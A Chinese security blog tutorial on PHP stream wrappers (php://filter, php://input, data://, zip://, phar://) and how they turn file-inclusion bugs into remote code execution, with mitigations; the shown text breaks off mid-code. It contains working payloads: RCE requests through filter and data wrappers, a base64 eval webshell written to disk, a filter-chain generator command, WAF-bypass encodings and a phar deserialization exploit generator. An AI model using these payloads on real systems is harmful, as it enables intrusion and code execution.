---
layout: post
title: "PHP 伪协议全方位详解：从流包装器底层机制到 filter chain RCE"
date: 2026-10-16 12:00:00 +0800
author: Security Researcher
categories: [网络安全, PHP安全]
tags: [PHP安全, 伪协议, Stream Wrapper, php://filter, php://input, data://, phar://, zip://, 文件包含, LFI, RCE, CTF, 代码审计]
description: "系统讲透 PHP 伪协议（流包装器）：Streams 三层机制、allow_url_fopen 与 allow_url_include 的真实生效范围，file://、php:// 全家族、data://、zip://、phar://、glob://、expect:// 逐个拆解，并整合 LFI 到 RCE、filter chain 任意内容构造与盲读、phar 反序列化、SSRF 等实战场景、绕过对照表与防御清单。"
---

> **免责声明**：本文仅用于本地靶场学习、CTF 训练与授权安全研究。所有示例默认作用于 `127.0.0.1` 或自建环境，请勿对未授权系统做任何测试。这些技术同时也是防御方必须理解的攻击模型，请以防御视角阅读本文。

---

## 0. 开篇：为什么"伪协议"值得单独写一篇长文

在 PHP 世界里，只要一个函数接受"文件路径"参数，这个参数就**不一定真的是文件路径**。它可以写成：

- `php://filter/read=convert.base64-encode/resource=config.php`
- `data://text/plain;base64,SGVsbG8=`
- `phar://uploads/avatar.jpg/avatar.txt`

这一类以 `xxx://` 开头的特殊字符串，官方名称叫**流包装器（Stream Wrappers）**，社区俗称"PHP 伪协议"。它是 PHP 文件包含（LFI）、文件读取、SSRF、反序列化等大量漏洞的**关键放大器**：同一个漏洞入口，能不能把"读任意文件"升级成"拿 shell"，很大程度上取决于你对伪协议的掌握程度。

读完本文，你应该能回答这些问题：

1. `php://filter` 为什么能在默认配置下读源码甚至 RCE，而 `php://input` 直接 include 却不行？
2. `allow_url_fopen` 和 `allow_url_include` 到底管住哪些协议、管不住哪些？
3. filter chain 是怎么从"一个空的输入流"凭空变出一句话木马的？
4. 上传一张"图片"为什么会触发反序列化？
5. 面对各种过滤，有哪些成熟的绕过路径？作为开发又该如何防御？

本文按"机制 → 逐个协议 → 攻击整合 → 防御"的顺序展开，力求每个细节都讲透。

---

## 1. 底层机制：PHP Streams 与"伪协议"的真实身份

### 1.1 一切从"文件路径参数"说起

PHP 处理文件 I/O 时并不是直接调用系统 `open()`，而是经过一层抽象——**PHP Streams（流）**。凡是走 Streams 的函数，其"路径"参数都会先被解析成：

```text
wrapper://target
```

其中 `wrapper` 是协议名（`file`、`php`、`data`、`phar`、`zip`……），`target` 是该协议自定义的"目标描述"。PHP 会根据协议名选择对应的包装器实现去处理后续的读写。

**关键认知：任何把用户输入拼进"文件路径"参数的代码，攻击面都不止本地文件，而是一整族协议。** 这就是伪协议在漏洞利用中地位特殊的原因。

### 1.2 流包装器的三层结构

PHP Streams 从上到下大致分三层：

1. **封装协议层（Wrapper）**：决定"数据从哪来/到哪去"，即本文的主角，如 `file://`、`http://`、`phar://`；
2. **过滤器层（Filter）**：对流动的数据做加工，如 `convert.base64-encode`、`string.rot13`、`zlib.inflate`，通过 `php://filter` 挂载；
3. **传输层（Transports）**：主要服务于网络套接字，如 `tcp://`、`ssl://`（通过 `stream_socket_client` 使用，与文件函数略有区别）。

伪协议（包装器）与过滤器是两个不同的概念，但通过 `php://filter` 被组合到了一起，这也是它强大的根源：**读一个文件的同时可以串联任意多层"内容加工"**。

### 1.3 哪些函数会走流？

几乎所有文件类函数都走 Streams，包括但不限于：

| 类别 | 函数（不完全） |
|---|---|
| 打开/读取 | `fopen` `file_get_contents` `file` `readfile` `fread` `fgets` `fpassthru` `fgetcsv` |
| 写入 | `file_put_contents` `fwrite` `fputcsv` `ftruncate` |
| 包含执行 | `include` `include_once` `require` `require_once` |
| 元信息 | `filesize` `filemtime` `file_exists` `is_file` `is_dir` `is_readable` `is_writable` `stat` `lstat` `touch` |
| 目录 | `opendir` `scandir` `readdir` `glob`（部分支持） |
| 复制/删除/改名 | `copy` `unlink` `rename` `mkdir` `rmdir` |
| 其他常见 | `hash_file` `md5_file` `sha1_file` `getimagesize` `exif_read_data` `exif_imagetype` `simplexml_load_file` `imagecreatefrompng` 等 |

注意 `include/require` 本质上也是"打开一个流、读入内容、把其中的 PHP 标签交给编译器"。**include 的目标可以是一个伪协议**，这正是后面大量利用手法的基础。

### 1.4 两个关键开关：allow_url_fopen 与 allow_url_include

PHP 手册为每个包装器标注了两个布尔属性（见各协议文档的 *Wrapper Summary* 表）：

- **Restricted by allow_url_fopen**：作为 `fopen()`/`file_get_contents()` 等函数的目标时，是否被这个配置项拦截；
- **Restricted by allow_url_include**：作为 `include`/`require` 的目标时，是否被这个配置项拦截。

两个配置项的默认值：

```ini
; php.ini 默认
allow_url_fopen = On    ; 默认开：file_get_contents 可以直接读 http/ftp/data
allow_url_include = Off ; 默认关：include 默认不能加载"URL 包装器"
```

按照官方手册的标注，常用协议的受限情况如下：

| 协议 | 受 allow_url_fopen 限制 | 受 allow_url_include 限制 | 默认配置下能 include 吗 |
|---|---|---|---|
| `file://` | 否 | 否 | 能 |
| `php://filter` | 否 | 否 | 能（重点） |
| `php://input` | 否 | **是** | 默认不能，需开 include 开关 |
| `data://` | 是 | 是 | 默认不能 |
| `http://` `https://` | 是 | 是 | 默认不能 |
| `ftp://` `ftps://` | 是 | 是 | 默认不能 |
| `zip://` | 否 | 否 | 能 |
| `phar://` | 否 | 否 | 能 |
| `compress.zlib://` | 否 | 否 | 能 |
| `glob://` | 否 | 否 | 能（但只能列目录） |
| `expect://` | 否 | 否 | 能 |

这张表解释了绝大多数"为什么这个 payload 在靶机上不灵"的疑问：

- `include('php://filter/...')` 与 `include('file://...')`、`include('phar://...')` **默认就能用**，因为它们不算 URL 包装器；
- `include('php://input')`、`include('data://...')` 默认被拦，老 CTF 环境常显式打开 `allow_url_include=On`；
- 另外 `allow_url_include` 自 PHP 7.4.0 起已被标记为**弃用**（未来版本会移除），新环境几乎不可能开它——所以现代利用思路都在"不受这两个开关管辖"的协议上做文章。

### 1.5 动手查看当前环境

```php
<?php
// 当前注册了哪些包装器
print_r(stream_get_wrappers());
// 典型输出：
// Array ( [0] => https [1] => ftps [2] => compress.zlib [3] => php
//         [4] => file [5] => glob [6] => data [7] => http [8] => ftp [9] => zip )

// 当前注册了哪些过滤器
print_r(stream_get_filters());
// Array ( [0] => zlib.* [1] => string.rot13 [2] => string.toupper
//         [3] => string.tolower [4] => string.strip_tags
//         [5] => convert.* [6] => consumed [7] => dechunk )
```

两个实用结论：

- 包装器/过滤器是否可用取决于编译选项与扩展（如 `zip://` 需要启用 zip 扩展，`compress.bzip2://` 需要 bz2 扩展）；
- 协议名**大小写不敏感**（内部会统一转为小写），`PHP://INPUT` 和 `php://input` 完全等价，所以"大小写变换"从来不是有效的绕过手段。

---

## 2. file://：一切的地基

`file://` 是本地文件系统包装器，也是显式写出"普通路径"的标准形式：

```php
<?php
// 下面三种写法等价
file_get_contents('/etc/passwd');
file_get_contents('file:///etc/passwd');
readfile('file://../../etc/passwd');   // 相对路径同样支持
```

要点：

1. **host 部分必须为空**：`file:///etc/passwd` 中三个斜杠，前两个属于 `://`，第三个表示"根目录"。写成 `file://localhost/etc/passwd` 在 Linux 下会失败；
2. 相对路径、`..` 穿越均按常规文件系统规则解析，`include_path` 对 `include` 生效；
3. `open_basedir` 对 `file://` 一视同仁地生效；
4. Windows 环境下注意盘符写法：`file:///C:/Windows/win.ini`。

`file://` 本身平淡无奇，它的意义在于：当你能控制路径参数时，即使什么"花哨协议"都被过滤，裸路径往往也能工作——**过滤 `file://` 关键字几乎没有意义**，因为不带协议名的路径默认就走 file 包装器。

---

## 3. php:// 协议族（本文核心）

### 3.1 家族成员总览

| 成员 | 方向 | 用途一句话 |
|---|---|---|
| `php://stdin` / `php://stdout` / `php://stderr` | 读 / 写 / 写 | CLI 进程的标准流 |
| `php://input` | 只读 | 原始 POST 请求体 |
| `php://output` | 只写 | 写入输出缓冲区（等价 echo） |
| `php://fd/N` | 读写 | 直接绑定进程的第 N 个文件描述符（PHP 5.3.6+） |
| `php://memory` | 读写 | 纯内存流 |
| `php://temp` | 读写 | 内存流，超过阈值落盘临时文件 |
| `php://filter` | 读写 | 给任意流挂过滤器链（漏洞利用的头号主角） |

### 3.2 php://filter 语法精讲

完整语法：

```text
php://filter/read=<过滤器链>/write=<过滤器链>/resource=<目标流>
```

- `read=` 与 `write=` 分别对"读方向"和"写方向"挂过滤器，可同时指定；
- 过滤器链内部用竖线分隔，**按书写顺序依次应用**；
- `read=` / `write=` 可以省略，只写过滤器名等价于 `read=`；
- `resource=` 是必填的，它本身也可以是另一个伪协议（这是大量组合技的基础）；
- 过滤器的参数（如 base64 的行宽）**无法直接写在 URL 里**，需要通过 stream context 传入（见 3.3）。

```php
<?php
// 读方向：先把 config.php 的内容 base64 编码，再输出
echo file_get_contents(
    'php://filter/read=convert.base64-encode/resource=config.php'
);

// 多级串联：base64 编码后再整体转大写
echo file_get_contents(
    'php://filter/read=convert.base64-encode|string.toupper/resource=config.php'
);

// 写方向：把字符串先 base64 解码再写入文件
file_put_contents(
    'php://filter/write=convert.base64-decode/resource=shell.php',
    'PD9waHAgcGhwaW5mbygpOyA/Pg=='   // <?php phpinfo(); ?>
);
```

### 3.3 官方过滤器全量清单（含参数与版本变化）

**String 过滤器：**

| 过滤器 | 作用 | 备注 |
|---|---|---|
| `string.rot13` | ROT13 变换 | 双向过滤器 |
| `string.toupper` | 转 ASCII 大写 | 双向 |
| `string.tolower` | 转 ASCII 小写 | 双向 |
| `string.strip_tags` | 剥离 HTML/PHP 标签 | PHP 7.3.0 弃用、**PHP 8.0.0 移除**；参数经 context |

**Conversion 过滤器：**

| 过滤器 | 作用 | 备注 |
|---|---|---|
| `convert.base64-encode` | base64 编码 | 参数 `line-length`（默认 76）、`line-break-chars`（默认回车换行），经 context 设置 |
| `convert.base64-decode` | base64 解码 | 参数 `strict`，经 context；strict 下遇到非法字符会报错（后面 oracle 会用到） |
| `convert.quoted-printable-encode` | QP 编码 | 参数经 context |
| `convert.quoted-printable-decode` | QP 解码 | 同上 |
| `convert.iconv.<in>.<out>` | 任意 iconv 字符集转换 | 语法如 `convert.iconv.UTF-8.UTF-16LE`；威力最大的一族，后面单独讲 |

**压缩过滤器：**

| 过滤器 | 作用 | 备注 |
|---|---|---|
| `zlib.deflate` | deflate 压缩 | 参数 `level` `window` `memory` 经 context；需 zlib（默认内建） |
| `zlib.inflate` | deflate 解压 | 参数 `window` |
| `bzip2.compress` / `bzip2.decompress` | bzip2 压缩/解压 | 需 bz2 扩展 |

**加密过滤器（历史）：**

`mcrypt.*` 与 `mdecrypt.*` 依赖 mcrypt 扩展，PHP 7.1 弃用、PHP 7.2 随扩展移除，老环境偶见。

**未写入手册但真实存在的过滤器：**

- `consumed`：调试用，"消耗"数据但不输出；
- `dechunk`：由 HTTP 流封装（`http_fopen_wrapper.c`）注册的 chunked 解码过滤器，**手册 Filters 列表中没有它，但 `php://filter` 能正常加载**。它按 HTTP chunked 规则解码：把流的第一行当作十六进制 chunk 长度，只忠实输出第一个 chunk 的内容，后续内容全部丢弃。这个"怪异但确定"的行为是后面盲读 oracle 的一个基石。

**convert.iconv 专题：**

`convert.iconv.<in>.<out>` 是过滤器中最有想象力的一族，它直接调用 iconv 在任意两种字符集间转换。几个在利用中反复出现的组合：

```text
convert.iconv.UTF8.CSISO2022KR     ; 转换时会在输出头部固定插入 4 字节：1b 24 29 43
convert.iconv.UTF8.UTF7            ; 特殊字符被改写成 +XXXX- 形式，造成"定向膨胀"
convert.iconv.UCS-2LE.UCS-2BE      ; 大小端互换，等效于每 2 字节内部反序
convert.iconv.UTF8.UTF16           ; ASCII 每字节膨胀成 2 字节
convert.iconv.UTF8.ISO-2022-CN-EXT ; CVE-2024-2961 的主角（见 3.8）
```

非法字节序列会触发 iconv 报错（如 `iconv(): Detected an illegal character in input string`），这个"报错"本身也是可观测的信号——3.9 的 error-based oracle 就建立在这上面。

### 3.4 实战一：base64 读源码（最经典的 LFI 升级）

漏洞点：

```php
<?php
// index.php —— 典型 LFI
include($_GET['page']);
```

如果直接 `?page=config.php`，config 里的 PHP 代码会被**执行**，你只能看到执行结果而非源码。用过滤器把内容变成 base64，PHP 标签被编码后就不再被词法分析器识别，源码将以"纯文本"形式回显：

```text
GET /index.php?page=php://filter/read=convert.base64-encode/resource=config.php
```

拿到 base64 解码即可得到完整源码。这是所有 LFI 流程的第一课：**`php://filter` 把"文件包含"降级成"文件读取"，同时躲开了执行**。

补充细节：

- `resource=` 指向的文件必须存在，否则流打开失败；
- `filesize('php://filter/...')` 恒为 0，因为流是顺序加工的，无法预先得知总长；
- `resource` 支持任意包装器：`resource=file:///etc/passwd`、`resource=http://...`、`resource=data://...`、`resource=php://input` 都合法。

### 3.5 实战二：编码变换绕过内容过滤

假设目标对"要被执行的文件内容"有敏感函数检查，过滤器可以在**读取时**把内容变换回来：

```php
<?php
// shell.txt 内容：<?cuc flfgrz('vq'); ?>   ← ROT13 过的 <?php system('id'); ?>
include('php://filter/read=string.rot13/resource=shell.txt');
```

include 的内容先经过 rot13 复原成 `<?php system('id'); ?>`，再交给编译器执行。同理可用：

- `convert.iconv.UCS-2LE.UCS-2BE`：每 2 字节反序，内容预先"反序存储"；
- `convert.quoted-printable-decode`：内容写成 `=3C=3F=70=68=70` 形态；
- `zlib.inflate`：内容是 deflate 压缩后的数据，检查方解不开也认不出；
- `convert.base64-decode`：内容为 base64 编码的代码。

**核心思想：静态检查器看到的是"变形后的内容"，执行时 filter 链负责"变形回来"。**

### 3.6 实战三：write 过滤器写文件（绕过写马检测）

`file_put_contents` 同样支持 `php://filter`。写入时让数据先过解码过滤器：

```php
<?php
// 攻击者控制第一个参数（路径）与第二个参数（内容）的场景
file_put_contents(
    'php://filter/write=convert.base64-decode/resource=shell.php',
    'PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg=='
);
```

落地到磁盘的 `shell.php` 是解码后的 PHP 代码。这个手法在"内容 WAF 检查明文特征、但检查发生在编码数据上"的场景非常好用。也可以多级串联（如先 `convert.iconv` 再 base64 解码）构造更复杂的落地内容，公开资料中常见 `convert.iconv.UCS-2LE.UCS-2BE` 与 `convert.base64-decode` 的组合，用于让磁盘内容与检查时看到的内容完全不同。

### 3.7 实战四：默认配置下的 RCE —— filter 作壳，input/data 作芯（重点）

这是本文**最值得背下来**的一组组合技，它绕开了 `allow_url_include` 的封锁。

先复习 1.4 的表格：`php://filter` 两个开关都不受限，所以它可以作为 include 的目标；而 filter 的 `resource` 是**以 fopen 语义**打开的，`php://input` 与 `data://` 在 fopen 语义下只受默认开启的 `allow_url_fopen` 管辖。

于是：

```http
GET /index.php?page=php://filter/read=convert.base64-decode/resource=php://input HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

PD9waHAgcGhwaW5mbygpOyA/Pg==
```

流程拆解：

1. `include` 打开 `php://filter` —— 不受任何 URL 开关限制；
2. filter 打开 `resource=php://input` —— fopen 语义，`allow_url_fopen=On`（默认）放行；
3. `php://input` 吐出 POST 原始 body（base64 编码的 PHP 代码）；
4. `convert.base64-decode` 把它变回 `<?php phpinfo(); ?>`；
5. include 将其交给编译器执行。

`data://` 版本（连 POST body 都不用发）：

```http
GET /index.php?page=php://filter/read=convert.base64-decode/resource=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== HTTP/1.1
```

两个 payload 在 `allow_url_include=Off` 的默认配置下直接可用。相比之下，`?page=php://input` 或 `?page=data://...` 直接作为 include 目标则会被 `allow_url_include` 拦截——这就是"filter 作壳"的意义。

GET 参数里的编码坑（对上述 payload 同样适用）：

- base64 中的加号会被 PHP 解析成空格，必须写成 `%2B`；
- payload 里出现 `&` 会被当作参数分隔符截断，需编码为 `%26`；
- `#` 会截断 URL，zip/phar 语法中的 `#` 一律写 `%23`。

### 3.8 实战五：filter chain —— 从空流凭空构造任意内容（RCE 新范式）

前面的手法都依赖"resource 里能塞进我们的代码"（POST body、data:// 等）。2022 年 Synacktiv 团队发表论文《PHP filter chains: file read from error-based oracle to command execution》，展示了更极端的能力：

> 只要把 filter 链**当作输入**（哪怕 `resource` 是一个空文件、`php://temp` 之类），通过多层 iconv 转换的叠加，可以像搭积木一样**逐字节构造出任意字节序列**，最终经 `convert.base64-decode` 输出完整的 PHP 一句话，配合 include 直接 RCE。

原理层面，它利用了四类"原语"的组合：

1. **前缀膨胀**：如 `convert.iconv.UTF8.CSISO2022KR` 每次转换会在输出头部固定插入 4 字节 `1b 24 29 43`，相当于一个"加 4 字节"的操作；
2. **成倍膨胀**：UTF-8 转 UTF-16/UCS-2 时，ASCII 字节会被扩成 2 字节，配合大小端转换实现字节倍增与移位；
3. **定向替换**：`convert.iconv.UTF8.UTF7` 会把特定字节改写成 `+XXXX-` 形态，用来在指定位置"造出"目标字符；
4. **规范化**：`convert.base64-encode` 与 `convert.base64-decode` 交替使用，把中间态"洗"回稳定状态，防止误差累积。

将这四类原语排列组合成千上万次，可以拼出任意目标串。实际操作不需要手工推导，直接使用公开生成器：

```bash
git clone https://github.com/synacktiv/php_filter_chain_generator
cd php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET[1]);?>'
```

工具会输出一条形如下面的超长 payload（链节长度与目标内容长度正相关）：

```text
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...（中间大量链节）...|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

把它塞进 LFI 的路径参数（或配合 `file_get_contents` 的"读取型 oracle"），即可在 `allow_url_include=Off`、`resource` 完全不受控的环境下完成 RCE。这条技术路线将伪协议利用从"读文件"推到了"无文件依赖的代码执行"，是近年 CTF 与红队评估中的标配。

**顺带一提 CVE-2024-2961**：2024 年 4 月披露的 glibc `iconv()` 缓冲区溢出（影响 glibc 低于 2.39 的版本）。当 PHP 通过 `php://filter` 的 `convert.iconv.UTF8.ISO-2022-CN-EXT` 等 ISO-2022/EBCDIC 系列转换处理数据时，可触发 glibc 堆溢出，把"只能读文件"的 primitive 直接升级为 RCE（Ambionics 公开了 cnext-exploit 工具）。它是 filter chain 思路的又一次进化，也提醒我们：**这条攻击面的边界在 PHP 之外，还延伸到了底层 C 库。**

### 3.9 实战六：盲读 oracle —— 页面不给回显也能逐字节读文件

很多 LFI 场景 `include` 了文件但不回显内容（blind）。过滤器链提供了两类 oracle：

**error-based oracle（论文第二部分）**：

- `convert.iconv.*` 遇到非法字节序列会抛出错误；`convert.base64-decode` 在 `strict` 模式下遇到字母表之外的字符也会报错；
- 这些错误会让 include 失败，页面产生可观测差异（空白页 vs 报错页/500）；
- 构造思路：先用膨胀原语把文件内容"放大"若干倍，使目标位置的字节被搬运到能决定"整条链是否报错"的位置，然后逐字节枚举（0 到 255），根据响应差异确定该字节。对每一字节重复，即可完整还原文件内容——包括 flag、配置、密钥。

**dechunk oracle**：

- 3.3 介绍过 `dechunk`：它把流当作 HTTP chunked 解码，第一行被当作十六进制长度，之后只输出第一个 chunk；
- 对普通文本文件（首行不是合法十六进制数），`php://filter/read=dechunk/resource=flag` 输出为空；若首行**恰好**以合法十六进制数开头则会有内容输出；
- 由此构造布尔差异，配合 iconv 系列对首行做字符枚举，可以专门探测"文件第一行"的内容。CTF 中"flag 在首行"的题目常用这一手。

两者本质相同：**把"文件某字节是什么"转化成"响应是否异常"**。

### 3.10 解析细节：URL 编码与 php://filter（WAF 绕过）

`php://filter` 在解析各段参数时会对 `read=` / `write=` / `resource=` 的值做 **URL 解码**（源码中显式调用 URL 解码函数）。这意味着整条 filter 链都可以全 URL 编码后传入：

```text
GET /index.php?page=php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php
```

衍生结论：

- 过滤器链分隔符可以写成 `%7C`，等号可以写成 `%3D`，用来躲开"明文特征"正则；
- 由于协议名解析前会统一小写，`PHP://FILTER` 不是绕过，但**URL 编码是真绕过**；
- 反过来说，防御侧的 WAF 必须在 URL 解码之后、乃至多重解码之后再做匹配，否则形同虚设。

### 3.11 php://input 深入

`php://input` 是只读流，返回**原始请求体**：

```php
<?php
$body = file_get_contents('php://input');
```

关键行为：

1. **multipart/form-data 时不可用**：PHP 不把 multipart 体灌入 `php://input`，这是唯一读不到的场景；其他 Content-Type（包括 `application/x-www-form-urlencoded`）都能读到原始字节，且与 `$_POST` 互不影响；
2. **PHP 5.6 起支持重复读取**：此前流只能读一次，5.6+ 可多次打开；
3. **作为 include 的直接目标受 `allow_url_include` 管辖**（Wrapper Summary 标注受限），默认 Off 拦截；但作为 filter 的 resource（fopen 语义）不受限，见 3.7；
4. 老环境（显式开 `allow_url_include=On`）的经典 RCE：

```http
POST /index.php?page=php://input HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

<?php system('id'); ?>
```

5. 请求体为空时 `php://input` 返回空字符串；CLI 下没有请求体，它无意义（CLI 用 `php://stdin`）。

### 3.12 php://output、php://memory、php://temp、php://fd

```php
<?php
// php://output：只写，写进输出缓冲，等价 echo
file_put_contents('php://output', 'hello');

// php://memory：纯内存流；php://temp：默认超过 2MB 转落盘临时文件
$fp = fopen('php://temp', 'r+');
fwrite($fp, 'temporary data');
rewind($fp);
echo fread($fp, 100);

// 自定义落盘阈值（字节）
$fp = fopen('php://temp/maxmemory:1048576', 'r+');

// php://fd/N：绑定文件描述符（PHP 5.3.6+），如标准输出：
file_put_contents('php://fd/1', "direct to stdout\n");
```

漏洞利用视角：这几个成员本身攻击价值不大，但 `php://temp` 常被 filter chain 生成器选作 resource（因为它总是可写、总是存在、内容可为空），是 3.8 payload 的组成部分。

### 3.13 CLI 三兄弟：stdin / stdout / stderr

```php
<?php
// 仅 CLI 环境有意义
$line = trim(fgets(STDIN));                 // 等价 fopen('php://stdin')
file_put_contents('php://stdout', "log\n"); // 等价 fopen('php://stdout')
file_put_contents('php://stderr', "err\n");
```

Web SAPI 下这些流通常打不开，属于了解即可的内容。

---

## 4. data://：最短的 RCE 通道

`data://` 是 RFC 2397 的 data URI 在 PHP 中的实现，语法：

```text
data://[<mediatype>][;base64],<payload>
```

```php
<?php
echo file_get_contents('data://text/plain,hello world');
echo file_get_contents('data://text/plain;base64,aGVsbG8=');
echo file_get_contents('data://text/html;charset=utf-8;base64,....');
```

**开关归属（容易记错）**：`data://` 的两个 Wrapper Summary 都受限：

- `file_get_contents('data://...')` 受 `allow_url_fopen`（默认 On）→ 默认可用；
- `include('data://...')` 受 `allow_url_include`（默认 Off）→ 默认被拦。

老环境开了 `allow_url_include` 时的直球 RCE：

```text
GET /index.php?page=data://text/plain,<?php system('id');?>
GET /index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
```

实用细节：

1. **GET 中的字符转义**：base64 的加号必须 `%2B`，`&` 必须 `%26`，否则内容会被截断或污染；明文形式中 `#` 会截断 URL fragment；
2. 明文形式里可以不带引号写代码：`data://text/plain,<?php system(id);?>`，配合 `${IFS}` 之类的 shell 技巧还能避开空格；
3. `data://` 在现代环境更多作为 **filter 的 resource** 出现（3.7 的组合），因为它只受 `allow_url_fopen` 管辖；
4. `data://` 是只读流，不能用于 `file_put_contents`。

## 5. 压缩与归档：compress.zlib://、compress.bzip2://、zip://、phar://

### 5.1 compress.zlib:// 与 compress.bzip2://

透明读写压缩文件（zlib 默认内建；bzip2 需要启用 bz2 扩展）：

```php
<?php
// 读：自动解压
echo file_get_contents('compress.zlib://backup.sql.gz');
echo file_get_contents('compress.bzip2://dump.bz2');

// 写：自动压缩
file_put_contents('compress.zlib://out.gz', $data);
file_put_contents('compress.bzip2://out.bz2', $data);
```

利用视角：

- LFI 中直接读服务器上的 `.gz` 备份、压缩日志（如轮转后的 `access.log.1.gz`）；
- 与 `php://filter` 的 `zlib.inflate` 过滤器是两种等价路径；
- 写方向可以在受限写文件场景下落地 gzip 文件（场景较少，了解即可）。

### 5.2 zip://

`zip://` 由 zip 扩展提供，用于把 zip 包内单个成员当普通文件访问：

```php
<?php
echo file_get_contents('zip://uploads/avatar.zip#shell.php');
```

**两个必须记住的细节**：

1. **成员路径用 `#` 分隔**，而 `#` 在 HTTP 参数中是 fragment 分隔符，必须编码成 `%23`：

```text
GET /index.php?page=zip://uploads/avatar.zip%23shell.php
```

2. `zip://` 是**只读**包装器；写 zip 要用 `ZipArchive`。

利用场景：上传校验只允许压缩包（或对图片做了 zip 嵌入），直接 include 压缩包内的 PHP 文件即可，**zip:// 不触发任何反序列化**（区别于 phar://）。不同 PHP 版本中 zip wrapper 的路径形态略有差异，使用时按目标版本实测。

### 5.3 phar:// 与 phar 反序列化（重中之重）

#### 5.3.1 phar 是什么

`phar://` 打开 PHP 归档（Phar archive）。Phar 支持三种容器格式：**原生 phar、tar、zip**——三者都能被 `phar://` 打开，且**不检查扩展名**：

```php
<?php
echo file_get_contents('phar://uploads/avatar.jpg/avatar.txt');
// 注意：即使 avatar.jpg 其实是个合法的 phar（含 tar/zip 结构），同样能打开
```

#### 5.3.2 phar 文件结构

```text
+--------------------------------------------------------------+
| stub（入口存根）                                              |
|   任意前缀（如 GIF89a） + __HALT_COMPILER(); 标记              |
|   规则：必须包含 __HALT_COMPILER(); 停止编译标记               |
+--------------------------------------------------------------+
| manifest（清单，序列化元数据所在地）                           |
|   phar 格式标志（4 字节）                                     |
|   全局元数据长度（4 字节） + serialize(元数据)   ← 反序列化点   |
|   文件数量（4 字节）                                          |
|   每个文件条目：                                              |
|     文件名长度 + 文件名 + 文件大小 + 时间戳                    |
|     + 文件级元数据长度 + serialize(文件元数据)  ← 反序列化点    |
|     + crc32 校验等                                           |
+--------------------------------------------------------------+
| 所有文件的实体内容                                            |
+--------------------------------------------------------------+
| 签名（可选）：类型 0x0001 MD5 / 0x0002 SHA-1 /                |
|              0x0004 SHA-256 / 0x0008 SHA-512 + 签名字节       |
+--------------------------------------------------------------+
```

#### 5.3.3 漏洞机制：打开即反序列化

phar 的元数据以 `serialize()` 格式存储在 manifest 中。**当任何文件操作函数以 `phar://` 协议打开归档时，PHP 会解析 manifest 并对元数据执行 `unserialize()`**——全局元数据在打开归档那一刻就触发，文件级元数据在访问对应条目时触发。整个过程**不需要目标代码显式调用 unserialize**，也不需要 `allow_url_*` 任何开关。

这就是 2018 年 Sam Thomas 在 BlackHat 公开的经典课题：《It's a PHP Unserialization Vulnerability Jim, But Not as We Know It》。

**触发函数清单**（源自该论文，不完全列表，覆盖面非常广）：

| 判断类 | 读取类 | 写/操作类 | 图片与其他 |
|---|---|---|---|
| `file_exists` `is_dir` `is_file` `is_link` | `fopen` `file_get_contents` `file` `readfile` | `copy` `unlink` `rename` `mkdir` | `getimagesize` `getimagesizefromstring` |
| `is_readable` `is_writable` `is_executable` | `file_put_contents` `fpassthru` `fgetcsv` | `rmdir` `touch` `chmod` `chown` | `exif_read_data` `exif_thumbnail` `exif_imagetype` |
| `filesize` `filetype` `fileatime` `filectime` | `hash_file` `md5_file` `sha1_file` | `chgrp` `scandir` `opendir` `glob` | `imagecreatefromgif/jpeg/png/webp` |
| `filemtime` `fileinode` `fileowner` `filegroup` `fileperms` | `parse_ini_file` `simplexml_load_file` | `stat` `lstat` `zip_open` | `imageloadfont` `SplFileInfo` 等 |

#### 5.3.4 生成恶意 phar

```php
<?php
// gen.php —— 注意：默认 phar.readonly=1 禁止写 phar，需 CLI 运行：
// php -d phar.readonly=0 gen.php
class Exploit {
    public $cmd;
    public function __destruct() {
        system($this->cmd);
    }
}
$phar = new Phar('evil.phar');
$phar->startBuffering();
// stub 前缀随意定制：加 GIF 头即可冒充图片
$phar->setStub('GIF89a' . '__HALT_COMPILER();');
$phar->setMetadata(new Exploit('id'));          // 全局元数据：反序列化点
$phar->addFromString('avatar.txt', 'hello');
$phar->stopBuffering();
```

目标站点只要有**任意一个**文件函数以 `phar://` 指向这个文件，`Exploit::__destruct` 就会执行：

```php
file_exists('phar://uploads/evil.jpg/avatar.txt');  // 触发！
```

#### 5.3.5 为什么 phar 反序列化如此好用

1. **入口极多**：上表几十个常见函数都能触发，业务代码几乎必中其一；
2. **不需要 unserialize 调用点**：传统反序列化漏洞必须找到显式 `unserialize` 用户输入的代码，phar 则完全绕开这一步；
3. **与上传天然契合**：
   - 不检查扩展名，`.jpg`、`.png`、`.pdf` 都行；
   - stub 前缀可定制，加 `GIF89a` 就能通过图片魔数检测；
   - `getimagesize`、`exif_read_data` 这类"图片校验函数"本身就是触发函数——**用来校验你的函数，恰好就是引爆点**；
4. **只差一条 POP 链**：元数据反序列化后需要有可用的 gadget chain（结合目标框架/组件的魔术方法链）才能 RCE，可与站内 PHP 反序列化系列文章配合阅读。

#### 5.3.6 状态与缓解

- `phar.readonly` 默认 `1`，且**只能在 php.ini 层面修改**（运行时 `ini_set` 无效），CLI 可用 `-d phar.readonly=0` 临时关闭；
- 元数据反序列化行为截至 PHP 8.x **依然存在**，升级 PHP 不能根治；
- 防御建议：
  - 对来自用户的文件路径做协议校验（拦截 `phar://`，注意大小写与 URL 编码变体）；
  - 上传目录与业务代码隔离，对"上传目录内的文件"避免调用上表中的文件函数；
  - 引入 TYPO3 的 `phar-stream-wrapper` 库做白名单式拦截；
  - 从架构上禁止用户控制任何文件函数的路径参数。

---

## 6. 其余协议速览

### 6.1 glob:// —— 只能看，不能读

目录列表专用包装器（列目录，不能读文件内容）：

```php
<?php
print_r(scandir('glob://*.php'));   // 按 glob 模式列目录
foreach (new DirectoryIterator('glob:///var/www/html/uploads/*') as $f) {
    echo $f->getFilename(), "\n";
}
```

利用价值：盲环境下探测文件名、确认目录结构。`file_get_contents('glob://...')` 会失败——它没有"文件内容"的概念。

### 6.2 expect:// —— 出现即 RCE

PECL 扩展 `expect` 提供的包装器，把参数当**命令**执行并返回输出：

```php
<?php
